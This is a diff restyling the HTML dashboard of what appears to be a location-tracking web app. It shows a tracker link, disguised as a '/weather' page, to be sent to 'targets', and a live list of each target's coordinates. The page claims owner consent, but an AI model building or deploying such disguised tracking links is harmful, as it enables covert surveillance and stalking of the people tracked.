@@ -4,210 +4,230 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Location Monitoring System</title>
-    <meta name="description" content="Real-time location visualization and authorized monitoring tools.">
+    <title>Location Intelligence — Live Location Monitoring System</title>
+    <meta name="description" content="Visualize authorized location updates through an interactive monitoring interface.">
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link rel="stylesheet"
-        href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;500;600&family=Space+Grotesk:wght@500;600;700&display=swap">
-    <link rel="stylesheet" href="/cyber.css">
+        href="https://fonts.googleapis.com/css2?family=Anton&family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;500;600&display=swap">
+    <link rel="stylesheet" href="/magenta.css">
     <style>
-        /* ---------- top bar ---------- */
-        .cy-header {
-            position: sticky;
-            top: 0;
-            z-index: 20;
+        /* ---------- header ---------- */
+        .mg-header {
+            position: relative;
+            z-index: 3;
             display: flex;
             align-items: center;
             justify-content: space-between;
             flex-wrap: wrap;
-            gap: var(--cy-s3) var(--cy-s5);
-            padding: var(--cy-s3) clamp(var(--cy-s4), 4vw, var(--cy-s6));
-            background: rgba(5, 8, 13, .88);
-            border-bottom: 1px solid var(--cy-border);
-            -webkit-backdrop-filter: blur(14px);
-            backdrop-filter: blur(14px);
+            gap: var(--mg-s3) var(--mg-s5);
+            padding: var(--mg-s4) clamp(var(--mg-s4), 4vw, var(--mg-s7));
+            border-bottom: 1px solid var(--mg-border-soft);
         }
 
-        .cy-brand {
+        .mg-brand {
             display: grid;
             gap: 2px;
         }
 
-        .cy-brand__name {
-            font-family: var(--cy-font-display);
-            font-size: .95rem;
-            font-weight: 700;
-            letter-spacing: .12em;
+        .mg-brand__name {
+            font-family: var(--mg-font-display);
+            font-size: 1rem;
+            font-weight: 400;
+            letter-spacing: .1em;
             text-transform: uppercase;
-            color: var(--cy-text);
+            color: var(--mg-white);
         }
 
-        .cy-brand__name em {
+        .mg-brand__name em {
             font-style: normal;
-            color: var(--cy-green);
+            color: var(--mg-pink);
         }
 
-        .cy-brand__sub {
-            font-family: var(--cy-font-mono);
-            font-size: .6rem;
-            letter-spacing: .2em;
+        .mg-brand__sub {
+            font-family: var(--mg-font-mono);
+            font-size: .58rem;
+            letter-spacing: .22em;
             text-transform: uppercase;
-            color: var(--cy-text-dim);
+            color: var(--mg-text-dim);
         }
 
-        .cy-header__meta {
+        .mg-header__meta {
             display: flex;
             align-items: center;
             flex-wrap: wrap;
-            gap: var(--cy-s3);
+            gap: var(--mg-s3);
         }
 
-        .cy-credit {
-            font-family: var(--cy-font-mono);
-            font-size: .6rem;
-            letter-spacing: .16em;
+        .mg-credit {
+            font-family: var(--mg-font-mono);
+            font-size: .58rem;
+            letter-spacing: .18em;
             text-transform: uppercase;
-            color: var(--cy-text-dim);
+            color: var(--mg-text-dim);
             white-space: nowrap;
         }
 
-        .cy-credit b {
-            color: var(--cy-text);
+        .mg-credit b {
+            color: var(--mg-white);
             font-weight: 600;
         }
 
         /* ---------- layout ---------- */
-        .cy-main {
-            width: min(1180px, 100%);
+        .mg-main {
+            position: relative;
+            z-index: 1;
+            width: min(1440px, 100%);
             margin: 0 auto;
-            padding: clamp(var(--cy-s5), 5vw, var(--cy-s7)) clamp(var(--cy-s4), 4vw, var(--cy-s6))
-                var(--cy-s7);
-            display: grid;
-            gap: var(--cy-s6);
+            padding: 0 clamp(var(--mg-s4), 4vw, var(--mg-s7)) var(--mg-s8);
         }
 
-        /* ---------- hero ---------- */
-        .cy-hero {
-            display: grid;
-            gap: var(--cy-s5);
+        /* ---------- hero: artwork left, type right ---------- */
+        .mg-hero {
+            grid-template-columns: minmax(0, 1fr) minmax(0, 1.12fr);
+            gap: clamp(var(--mg-s5), 4vw, var(--mg-s7));
         }
 
-        .cy-deploy {
-            display: grid;
-            gap: var(--cy-s2);
+        .mg-hero__copy {
+            max-width: 700px;
         }
 
-        .cy-deploy__row {
-            display: flex;
-            align-items: center;
-            flex-wrap: wrap;
-            gap: var(--cy-s2) var(--cy-s3);
+        /* ---------- targets ---------- */
+        .mg-targets {
+            position: relative;
+            z-index: 1;
         }
 
-        .cy-deploy code {
-            font-family: var(--cy-font-mono);
-            font-size: .8rem;
-            color: var(--cy-green);
-            word-break: break-all;
-            padding: 2px 0;
-        }
+        /* ---------- responsive ---------- */
+        @media (max-width: 1000px) {
+            .mg-hero {
+                grid-template-columns: 1fr;
+                min-height: 0;
+            }
 
-        .cy-deploy__note {
-            margin: var(--cy-s1) 0 0;
-            padding-top: var(--cy-s3);
-            border-top: 1px solid var(--cy-border-soft);
-            font-size: .8rem;
-            color: var(--cy-text-dim);
-        }
+            /* the illustration becomes a cropped backdrop behind the copy
+               instead of a column, so nothing gets pushed off-screen */
+            .mg-hero__art {
+                position: absolute;
+                inset: -2vh 0 auto 0;
+                height: 60vh;
+                min-height: 0;
+                z-index: 0;
+                opacity: .62;
+            }
 
-        /* ---------- target section ----------
-           #tar-content IS the grid: the existing socket handler appends
-           new cards directly to this element, so making it the grid
-           container means live cards lay out with the server-rendered
-           ones automatically. */
-        #tar-content {
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
-            gap: var(--cy-s3);
-        }
+            /* narrow crops are useless, so the crop is aimed at the rim-lit
+               side of the hood rather than at the figure's centre */
+            .mg-hero__art .mg-figure {
+                object-position: 64% 12%;
+            }
 
-        .cy-section-head {
-            grid-column: 1 / -1;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            flex-wrap: wrap;
-            gap: var(--cy-s3);
-            margin-bottom: var(--cy-s2);
-            padding-bottom: var(--cy-s3);
-            border-bottom: 1px solid var(--cy-border-soft);
-        }
+            .mg-hero__art::after {
+                /* the top of the crop stays legible; the copy sits lower down,
+                   where the scrim is already near-solid */
+                background:
+                    linear-gradient(180deg, rgba(5, 4, 11, .12) 0%, rgba(5, 4, 11, .58) 38%, rgba(5, 4, 11, .88) 64%, var(--mg-bg) 94%),
+                    linear-gradient(90deg, rgba(5, 4, 11, .42) 0%, transparent 70%);
+            }
 
-        .cy-section-head h2 {
-            margin: 0;
-            font-family: var(--cy-font-display);
-            font-size: .82rem;
-            font-weight: 600;
-            letter-spacing: .18em;
-            text-transform: uppercase;
-            color: var(--cy-text);
+            .mg-hero__copy {
+                padding-top: clamp(120px, 26vh, 210px);
+            }
+
+            .mg-display {
+                font-size: clamp(2.7rem, 6.4vw, 6.1rem);
+            }
+
+            .mg-hero {
+                padding-bottom: var(--mg-s6);
+            }
         }
 
         @media (max-width: 560px) {
-            .cy-header {
+            .mg-header {
                 justify-content: flex-start;
             }
 
-            .cy-brand__name {
-                font-size: .82rem;
+            .mg-brand__name {
+                font-size: .88rem;
+            }
+
+            .mg-hero__art {
+                height: 52vh;
+                opacity: .58;
             }
         }
     </style>
 </head>
 
-<body class="cy-body cy-scroll">
-    <div class="cy-bg"></div>
-    <div class="cy-bg__grid"></div>
-    <div class="cy-bg__scan"></div>
+<body class="mg-body mg-scroll">
+    <div class="mg-bg"></div>
+    <div class="mg-grid"></div>
+
+    <!-- decorative motion layers; every child is aria-hidden and inert -->
+    <div class="mg-motion" aria-hidden="true">
+        <div class="mg-motion__particles"></div>
+        <div class="mg-motion__streaks"></div>
+        <div class="mg-motion__glitch"></div>
+        <svg class="mg-wire mg-motion__wire" viewBox="0 0 540 500" preserveAspectRatio="xMidYMid meet"></svg>
+    </div>
 
     <!-- ================= HEADER ================= -->
-    <header class="cy-header">
-        <div class="cy-brand">
-            <span class="cy-brand__name">Live Location <em>Intelligence</em></span>
-            <span class="cy-brand__sub">Ethical Monitoring Interface</span>
+    <header class="mg-header">
+        <div class="mg-brand">
+            <span class="mg-brand__name">Live Location <em>Intelligence</em></span>
+            <span class="mg-brand__sub">Ethical Monitoring Interface</span>
         </div>
-        <div class="cy-header__meta">
-            <!-- neutral label: the application exposes no public
-                 connection-state signal on this page -->
-            <span class="cy-status">
-                <span class="cy-dot cy-dot--idle" aria-hidden="true"></span>
+        <div class="mg-header__meta">
+            <!-- neutral label: this page exposes no public connection state -->
+            <span class="mg-badge">
+                <span class="mg-dot mg-dot--idle" aria-hidden="true"></span>
                 Monitoring Interface
             </span>
-            <span class="cy-credit">Built by <b>Kishore Kumar</b></span>
+            <span class="mg-credit">Engineered by <b>Kishore Kumar</b></span>
         </div>
     </header>
 
-    <main class="cy-main">
+    <main class="mg-main">
         <!-- ================= HERO ================= -->
-        <section class="cy-hero">
-            <div>
-                <span class="cy-label cy-in">Operations Console</span>
-                <h1 class="cy-h1 cy-in" style="--cy-d:80ms">Location Monitoring System</h1>
-                <p class="cy-lead cy-in" style="--cy-d:160ms">
-                    Real-time location visualization and authorized monitoring tools.
-                </p>
+        <section class="mg-hero">
+            <div class="mg-hero__art" aria-hidden="true">
+                <!-- original low-poly artwork: public/assets/figure.svg -->
+                <img class="mg-figure" src="/assets/figure.svg" alt="" width="800" height="1010"
+                    fetchpriority="high" decoding="async">
             </div>
 
-            <div class="cy-panel cy-panel--pad cy-panel--hud cy-deploy cy-in" style="--cy-d:240ms">
-                <div class="cy-deploy__row">
-                    <span class="cy-label">Tracker Endpoint</span>
-                    <span class="cy-label cy-label--cyan">Send to Target</span>
+            <div class="mg-hero__copy">
+                <span class="mg-eyebrow">Authorized Monitoring Console</span>
+
+                <h1 class="mg-display">
+                    <span class="mg-display__line" style="--mg-d:120ms">Location</span>
+                    <span class="mg-display__line mg-display__line--alt" style="--mg-d:280ms">Intellig<em>ence</em></span>
+                </h1>
+
+                <span class="mg-display-rule"></span>
+
+                <p class="mg-sub">Live Location Monitoring System</p>
+                <p class="mg-lede">
+                    Visualize authorized location updates through an interactive monitoring interface.
+                </p>
+
+                <!-- existing endpoint, template expression and copy untouched -->
+                <div class="mg-panel mg-panel--pad mg-panel--hud mg-deploy mg-in" style="--mg-d:520ms">
+                    <div class="mg-deploy__row">
+                        <span class="mg-label mg-label--pink">Tracker Endpoint</span>
+                        <span class="mg-label">Send to Target</span>
+                    </div>
+                    <code>{{ global.remoteURL }}/weather</code>
+                    <p class="mg-deploy__note">
+                        Open this address on a device whose owner has agreed to be monitored, then approve the
+                        browser location prompt. Coordinates are only transmitted after that permission is granted.
+                    </p>
                 </div>
-                <code>{{ global.remoteURL }}/weather</code>
-                <p class="cy-deploy__note">
-                    Open this address on a device whose owner has agreed to be monitored, then approve the
-                    browser location prompt. Coordinates are only transmitted after that permission is granted.
+
+                <p class="mg-credit-line mg-in" style="--mg-d:640ms">
+                    <span class="mg-dot" aria-hidden="true"></span>
+                    <span>Engineered by <b>Kishore Kumar</b></span>
                 </p>
             </div>
         </section>
@@ -215,25 +235,25 @@
         <!-- ================= TARGETS ================= -->
         <!-- existing #tar-content container retained: the socket handler
              appends new target cards to this exact element -->
-        <section id="tar-content">
-            <div class="cy-section-head">
+        <section id="tar-content" class="mg-targets">
+            <div class="mg-section-head">
                 <h2>Active Targets</h2>
-                <span class="cy-badge" data-cy-target-count>0 TARGETS</span>
+                <span class="mg-badge" data-mg-target-count>0 TARGETS</span>
             </div>
 
             {{~ const __targetCount = Object.keys(TARGETS).length }}
             {{ if (__targetCount > 0) }}
             {{ for(value, key in TARGETS) }}
-            <a href="/map?id={{ key }}" class="button is-fullwidth cy-card cy-in" data-cy-counted="1">
-                <span class="cy-card__label">Target Node</span>
-                <span class="cy-card__id">{{ key }}</span>
-                <span class="cy-card__meta">LAT {{ value[0] }}&ensp;·&ensp;LNG {{ value[1] }}</span>
+            <a href="/map?id={{ key }}" class="button is-fullwidth mg-card mg-in" data-mg-counted="1">
+                <span class="mg-card__label">Target Node</span>
+                <span class="mg-card__id">{{ key }}</span>
+                <span class="mg-card__meta">LAT {{ value[0] }}&ensp;·&ensp;LNG {{ value[1] }}</span>
             </a>
             {{/}}
             {{ else }}
-            <div class="cy-empty">
-                <span class="cy-empty__title">No targets registered</span>
-                <p class="cy-empty__text">
+            <div class="mg-empty">
+                <span class="mg-empty__title">No targets registered</span>
+                <p class="mg-empty__text">
                     Nothing has reported a location yet. Send the tracker endpoint above to an authorized
                     device to start a session.
                 </p>
@@ -243,7 +263,7 @@
     </main>
 
     <script src="https://cdn.jsdelivr.net/npm/socket.io@4.8.1/client-dist/socket.io.min.js"></script>
-    <script src="/cyber-ui.js"></script>
+    <script src="/magenta-ui.js"></script>
     <script>
         const content = document.querySelector("#tar-content")
         const socket = io("", {
@@ -255,7 +275,7 @@
         socket.on("user-connected", newId => {
             const a = document.createElement('a')
             a.href = `/map?id=${newId}`
-            a.className = "button is-fullwidth cy-card"
+            a.className = "button is-fullwidth mg-card"
             a.innerText = newId
             content.appendChild(a)
         })
